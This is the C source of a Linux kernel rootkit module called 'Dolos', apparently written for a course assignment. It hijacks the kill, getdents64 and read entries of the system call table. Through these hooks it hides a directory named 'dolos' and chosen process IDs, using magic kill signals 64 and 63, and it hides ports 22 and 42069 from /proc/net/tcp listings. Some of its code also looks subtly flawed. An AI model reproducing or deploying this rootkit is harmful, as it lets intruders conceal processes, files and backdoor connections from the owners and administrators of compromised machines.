#include <linux/init.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/kprobes.h>
#include <net/tcp.h>
#include <linux/kernel.h>
#include <linux/string.h>
MODULE_LICENSE("GPL");
MODULE_VERSION("0.1");

#ifndef DEBUG
#define DEBUG 1
#endif
/* A simple debug print macro that will be compiled out if not defined */
  /* https://stackoverflow.com/questions/1644868/define-macro-for-debug-printing-in-c */
#define debug_print(str)\
    do { if (DEBUG) pr_warn("Dolos: %s\n", str); } while(0)

static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};
static unsigned long * __sys_call_table;
typedef asmlinkage long (*orig_kill_t)(pid_t pid, int signal);
typedef asmlinkage long (*orig_getdents64_t)(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);
typedef asmlinkage long (*orig_tcp4_seq_show_t)(struct seq_file *seq, void *v);
typedef asmlinkage long (*orig_read_t) (int fd, char __user *buf, size_t count);

orig_read_t orig_read;
orig_kill_t orig_kill;
orig_getdents64_t orig_getdents64;
orig_tcp4_seq_show_t orig_tcp4_seq_show;
#define NAME_MAX 1000

char HIDE_DIR[] = "dolos";

//Task 1
char HIDE_PID[NAME_MAX];   
char HIDE_PORT[100];
//Task 2
#define PORT_TO_HIDE 2
#define TMPSV 150
asmlinkage int dolos_kill(pid_t pid, int signal)
{
    debug_print("kill called");
    //printk(KERN_WARNING "calling orig_kill at %px", orig_kill);
    if(signal == 64){
        sprintf(HIDE_PID, "%d", pid);
        printk("%s", HIDE_PID);
        return 0;
    }
    if(signal == 63){
        sprintf(HIDE_PORT, "%d", pid);
        printk("%s", HIDE_PORT);
        return 0;
    }
    return orig_kill(pid, signal);
}

asmlinkage long dolos_read(int fd, char __user *buf, size_t count){
    //Get the file read using fget and pass in the file descriptor
    struct file* file_read = fget(fd);
    if(strcmp(file_read->f_path.dentry->d_iname, "tcp") == 0){
        long ret = orig_read(fd, buf, count);
        char* buf_filter = (char*)kzalloc(count, GFP_KERNEL);
        if( (ret <= 0) || (buf_filter == NULL)){
            return ret;
        }
        long error = 0;
        char** lines = (char**)kzalloc(sizeof(char*)*20, GFP_KERNEL); //allocate 20 lines of memory
        int line_to_hide_idx = -1; //find where in the substring where to hide the line
        int byte_count = 0; //how many bytes in the line
        int offset = 0; //where in the entire buf string we are
        int i = 0; //index of the buffer
        int num_lines = 0; //number of lines we read

        error = copy_from_user(buf_filter, buf, ret);
        char cur = buf_filter[0];

        //parse the buff string into a 2D char array called lines
        while(cur != '\0'){
            if(cur == '\n'){
                char* line_added = (char*)kzalloc(sizeof(char)*(byte_count+1), GFP_KERNEL);
                
                //Add to the line_added by the up to what we've searched for
                //the offset is so we know where we're at in the char*, copy much byte count
                memcpy(line_added, (buf_filter+offset), byte_count);
                line_added[byte_count] = '\0';
                lines[num_lines] = line_added;
                offset += byte_count;
                byte_count = 0;
                num_lines++;
            }
            else{
                //How many bytes to add to the line thats being added
                byte_count++;
            }
            i++;
            cur = buf_filter[i];
        }
        //Search in the lines where the port number is at
        for(i = 0; i < num_lines; i++){
            if(strstr(lines[i], ":0016")){
                line_to_hide_idx = i;
                //printk(KERN_WARNING "INDEX OF LINE IS %i", line_to_hide_idx);
            }
        }

        //copy back into the buffer and remove the line
        offset = 0;
        memset(buf_filter, 0, count);
        for(i= 0; i < num_lines; i++){
            if(i != line_to_hide_idx){
                memcpy(buf_filter+offset, lines[i], strlen(lines[i]));
                buf_filter[offset+strlen(lines[i])] = '\n';
                offset += strlen(lines[i]);
            }
        }
        //printk(KERN_WARNING "Buffer filled %s\n\n", buf_filter);
        *(buf_filter+offset) = '\0';
        for(i = 0; i < num_lines; i++){
            kfree(lines[i]);
        }
        kfree(lines);
        error = copy_to_user(buf, buf_filter, count);
        kfree(buf_filter);
        return ret;
    }
    else{
        return orig_read(fd, buf, count);
    }
}
/*
int hide_pid(readdir_t* orig_readdir, readdir_t new_readdir){
    struct file *filep;
    //if((filep == filp_open))
}
*/
//overwrite own instructions
static asmlinkage long dolos_tcp4_show(struct seq_file *seq, void *v){
    /*__asm__(
        "push rbp,"
        "mov rbp, rsp\n"
        "sub rsp, 0x80\n"
    );*/
    struct tcp_iter_state *st;
    struct sock *sk = v;
    printk("Port read %i", sk->sk_num);
    //check if the rat port calls to local host hard code it
    if(sk != 0x1 && (sk->sk_num == 0xA455 || sk->sk_num == 0x16)){
        printk("Hiding port: 22 or 42069");
        return 0;
    }
    
    return orig_tcp4_seq_show(seq, v);
}



asmlinkage int dolos_getdents64(unsigned int fd, struct linux_dirent64 __user * dirent, unsigned int count)
{
    /* struct linux_dirent64 __user * dirent = (struct linux_dirent64*)regs->si; */

    long error;

    struct linux_dirent64 *cur, *prev, *ker = NULL;

    unsigned long offset = 0;

    /* call the original */
    int ret = orig_getdents64(fd, dirent, count);

    /* allocate neccesary bytes in kernel because current data is in userland */
    ker = kzalloc(ret, GFP_KERNEL);

    if ( (ret <= 0 ) || (ker == NULL))
    {
        return ret;
    }

    /* copy the data from userland to our kernel buffer */
    error = copy_from_user(ker, dirent, ret);
    if(error)
        goto done;

    /* loop through the entries */
    while (offset < ret)
    {
        cur = (void*) ker + offset;
        
        /* if the name starts HIDE_DIR */
        if ((strcmp(HIDE_DIR, cur->d_name) == 0)
        || (strcmp(HIDE_PID, cur->d_name) == 0))
        {
            printk(HIDE_PID);
            /* handle special case where its the first entry */
            if (cur == ker)
            {
                ret -= cur->d_reclen;
                memmove(cur, (void*) cur + cur->d_reclen, ret);
                continue;
            }
            /* have the previous entry contain this one effectively removing it */
            prev->d_reclen += cur->d_reclen;
        }
        else
        {
            prev = cur;
        }
        offset += cur->d_reclen;
    }

    /* copy current buff to back to user land */
    error = copy_to_user(dirent, ker, ret);
    if (error)
        goto done;
done:
    kfree(ker);
    return ret;
}
static int __init dolos_init(void)
{
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name;
    register_kprobe(&kp);
    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);

    __sys_call_table = (unsigned long *) kallsyms_lookup_name("sys_call_table");
    orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];
    orig_getdents64 = (orig_getdents64_t)__sys_call_table[__NR_getdents64];
    orig_read = (orig_read_t)__sys_call_table[__NR_read];

    __sys_call_table[__NR_read] = (unsigned long) dolos_read;
    __sys_call_table[__NR_kill] = (unsigned long )dolos_kill;
    __sys_call_table[__NR_getdents64] = (unsigned long )dolos_getdents64;
    /*
    void * tcp4_seq_show = kallsyms_lookup_name("tcp4_seq_show");

    long stuff = *(long *) tcp4_seq_show;
    printk(KERN_WARNING "%px contains %lx", tcp4_seq_show, stuff);
    */
    debug_print("loaded");
    return 0;
}

static void __exit dolos_exit(void)
{
    __sys_call_table[__NR_read] = (unsigned long) orig_read;
    __sys_call_table[__NR_kill] = (unsigned long) orig_kill;
    __sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
    debug_print("unloaded");
}

module_init(dolos_init);
module_exit(dolos_exit);
